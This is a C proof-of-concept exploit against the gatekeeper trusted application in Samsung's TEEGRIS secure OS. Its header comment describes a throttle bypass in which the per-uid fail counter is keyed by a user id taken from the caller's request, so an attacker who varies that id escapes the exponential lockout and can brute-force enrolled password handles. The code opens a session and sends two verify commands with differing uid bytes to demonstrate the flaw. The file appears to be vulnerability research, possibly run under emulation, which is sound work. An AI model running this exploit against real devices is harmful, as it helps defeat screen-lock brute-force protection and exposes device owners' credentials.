/*
 * gatekeeper throttle bypass via REE-supplied user_id (cmd 0x7e = verify).
 *
 * Finding (RE/samsung_teegris/gatekeeper.md, emulation/gatekeeper.md): the
 * per-uid fail counter is a persistent object named "gk_fail_counter%u" where
 * the %u comes straight from the REE-supplied verify request, with NO
 * TEE_GetPropertyAsIdentity / TEES_GetClientCredentials binding. gk_fail_load
 * runs on every verify (to check the throttle) BEFORE the password HMAC. So a
 * caller that varies the uid lands on a *different* counter file each time ->
 * each is a missing/first-attempt counter -> the exponential throttle never
 * accrues -> any enrolled handle can be brute-forced.
 *
 * This PoC invokes verify twice with two different request buffers (uid bytes
 * differ). With the persistent store modelled, the host sees two DISTINCT
 * gk_fail_counter<N> objects appear -> the throttle state is per-REE-uid, i.e.
 * attacker-partitioned, exactly as the static finding says.
 *
 * Param layout from the fuzz harness 474154454b45_cmd7e: ptypes 0x557 =
 * [MEMREF_INOUT(0x419), MEMREF_INPUT(0x3a), MEMREF_INPUT(0x419), NONE].
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

static void verify_with_fill(TEEC_Session *s, unsigned char fill)
{
    TEEC_Operation op;
    unsigned char *p0 = malloc(0x419), *p1 = malloc(0x3a), *p2 = malloc(0x419);
    memset(p0, fill, 0x419);     /* the password_handle blob — uid is read from here */
    memset(p1, fill, 0x3a);      /* provided-password request */
    memset(p2, 0,    0x419);
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INPUT,
                                     TEEC_MEMREF_TEMP_INPUT, TEEC_NONE);
    op.params[0].tmpref.buffer = p0; op.params[0].tmpref.size = 0x419;
    op.params[1].tmpref.buffer = p1; op.params[1].tmpref.size = 0x3a;
    op.params[2].tmpref.buffer = p2; op.params[2].tmpref.size = 0x419;
    uint32_t eo;
    TEEC_Result res = TEEC_InvokeCommand_impl(s, 0x7e, &op, &eo);
    printf("[*] verify (param0 filled 0x%02x) -> 0x%x\n", fill, res);
    free(p0); free(p1); free(p2);
}

int main(void)
{
    char* ta = "00000000-0000-0000-0000-474154454b45";   /* gatekeeper */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                               NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x/0x%x\n", res, err_origin); exit(-1); }
    printf("[*] session opened to gatekeeper (PUBLIC login)\n");

    /* two verifies, different uid bytes -> should hit two different counter files */
    verify_with_fill(&session, 0x11);
    verify_with_fill(&session, 0x22);

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
